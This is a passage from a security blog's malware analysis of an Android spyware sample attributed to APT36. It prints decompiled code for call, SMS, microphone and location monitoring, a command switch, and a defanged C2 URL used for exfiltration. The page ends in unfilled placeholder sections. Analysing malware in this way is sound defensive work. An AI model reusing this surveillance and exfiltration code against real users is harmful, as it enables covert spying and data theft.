            v10_0 = 15;
          }
          break;
        }
        case 451310959: {
          if (!p28.equals("vibrate")) {
          } else {
            v10_0 = 26;
          }
          break;
        }
        case 735830995: {
          if (!p28.equals("recordstop")) {
          } else {
            v10_0 = 3;
          }
          break;
        }
        case 933070462: {
          if (!p28.equals("smsmoniterdw")) {
          } else {
            v10_0 = 11;
          }
          break;
        }
        case 933070982: {
          if (!p28.equals("smsmoniterup")) {
          } else {
            v10_0 = 10;
          }
          break;
        }
        case 993551837: {
          if (!p28.equals("recordcal")) {
          } else {
            v10_0 = 0;
          }
          break;
        }
        case 993561686: {
          if (!p28.equals("recordmic")) {
          } else {
            v10_0 = 2;
          }
          break;
        }
        case 1427818632: {
          if (!p28.equals("download")) {
          } else {
            v10_0 = 13;
          }
          break;
        }
        case 1764172231: {
          if (!p28.equals("deleteFile")) {
          } else {
            v10_0 = 19;
          }
          break;
        }
        case 1894189872: {
          if (!p28.equals("stopcallrec")) {
          } else {
            v10_0 = 1;
          }
          break;
        }
        case 1979932881: {
          if (!p28.equals("sendsms")) {
          } else {
            v10_0 = 29;
          }
          break;
        }
      }

  public void sendLocNetwork(String p13, String p14) {
    try {
      String v8_3;
      Maybe([ARRAY, OBJECT]) v11_0 = new com.example.redacted.redacted.GPSListener(v6_0);
      Maybe([ARRAY, OBJECT]) v6_1 = v11_0;
      v11_0.<init>(this.ctx);
      Maybe([ARRAY, OBJECT]) v3_0 = v6_1;
      v3_0.getStatus();
      Maybe([ARRAY, OBJECT]) v11_1 = new org.json.JSONObject(v6_3);
      Maybe([ARRAY, OBJECT]) v6_4 = v11_1;
      v11_1.<init>();
      Maybe([ARRAY, OBJECT]) v4_0 = v6_4;
      Maybe([ARRAY, OBJECT]) v11_2 = new org.json.JSONArray(v6_5);
      Maybe([ARRAY, OBJECT]) v6_6 = v11_2;
      v11_2.<init>();
      Maybe([ARRAY, OBJECT]) v5_0 = v6_6;
    } catch (org.json.JSONException v6_8) {
      v6_8.printStackTrace();
      return;
    }
</i>
</pre>
    
    <p>In addition to the above, the sample contains a `CallMonitor` class and a `SMSMonitor` class, these classes are associated with registered broadcast recievers permiting real-time monitoring of inbound phone calls and SMS messages. Both of these receivers define a HTTP asynchronous task containing callbacks to another class titled `setting`. This `setting` class defines the adversary's remote C2 within the `webUrl` parameter and is leveraged for C2 input alongside data exfiltration mechanics from data extracted from the device. The nested CallMonitor$HttpAsyncTask class ilustrates this below:</p>
    
    <pre class="hack dark"><i>
public class com.example.redacted.redacted.CallMonitor$HttpAsyncTask extends android.os.AsyncTask {
  final synthetic com.example.redacted.redacted.CallMonitor this$0;

  public constructor com.example.redacted.redacted.CallMonitor$HttpAsyncTask(com.example.redacted.redacted.CallMonitor p5) {
    this.this$0 = p5;
    return;
  }

  protected synthetic bridge Object doInBackground(Object[] p5) {
    return this.doInBackground(((org.json.JSONObject[])p5));
  }

  protected varargs String doInBackground(org.json.JSONObject[] p8) {
    Maybe([ARRAY, OBJECT]) v6_0 = new com.example.redacted.redacted.httpCall(v3_0);
    Maybe([ARRAY, OBJECT]) v3_1 = v6_0;
    v6_0.<init>();
    return v3_1.POST(p8[0]);
  }
}
</i>
</pre>
    <p>Following the callback `v14_2.<init>(com.example.appcode.appcode.setting.weburl);`, highlights the remote C2 source, a hard-coded static value, defined within a webUrl parameter within the referenced `setting` class (truncated for brevity):</p>
     <p>The above contains `v14_2.<init>(com.example.appcode.appcode.setting.weburl);`, a callback to the `setting` class where webUrl, a parameter assigned with a hard-coded value, is defined. This value is the malware sample's remote C2 server, of which, is used to transmit dynamic commands from APT36 to the compromised device, as well as, exfiltrate extracted device data over a HTTP socket:</p>
     
     <pre class="hack dark"><i>
static {
    com.example.redacted.redacted.setting.verion = "1.0.0.0";
    com.example.redacted.redacted.setting.weburl = "http[:]//android[.]viral91[.]xyz/admin/webservices";      [REMOTE C2 FOR COMMAND EXECUTION AND DATA EXFILTRATION]
    com.example.redacted.redacted.setting.errors = 0;
    com.example.redacted.redacted.setting.imi = "";
    com.example.redacted.redacted.setting.os = "";
    com.example.redacted.redacted.setting.ip = "";
    com.example.redacted.redacted.setting.userID = 0;
</i>
</pre>
    <p>FINAL COMMENTS ON SAMPLE X AND CONCLUSION</p>
     
<p>#[ANALYSIS OF SAMPLE Y] :</p>

    <p>blah</p>
<pre class="hack dark"><i>
CODE SNIPIT HERE
</i>
</pre>

    <p>blah</p>

    <pre class="hack dark"><i>
CODE SNIPIT HERE
</i>
</pre>
    
    <p>blah</p>
    
    <pre class="hack dark"><i>
CODE SNIPIT HERE
</i>
</pre>
    <p>blah</p>
     <pre class="hack dark"><i>
CODE SNIPIT HERE
</i>
</pre>
    <p>blah</p>
     <pre class="hack dark"><i>
CODE SNIPIT HERE
</i>
</pre>
    <p>blah</p>
     <pre class="hack dark"><i>
CODE SNIPIT HERE
</i>
</pre>
    <p>blah</p>
    
    <p>#[YARRA RULE TO IDENTIFY FUTURE VARIANTS BASED ON SIMILARITIES WITHIN SAMPLE SET] :</p>
    <p>blah</p>
      <p>blah</p>
<pre class="hack dark"><i>
CODE SNIPIT HERE
</i>
<p>blah</p>
      <p>#[CONCLUSION] :</p>
    <p>blah</p>
<p> ~ ret2eax
</div>
<center>
<footer><< <a href=mailto:ret2eax@riseup.net>ret2eax@riseup.net</a> >></footer></center>
<p>
</body>
</html>


<!-- Goodbye -->
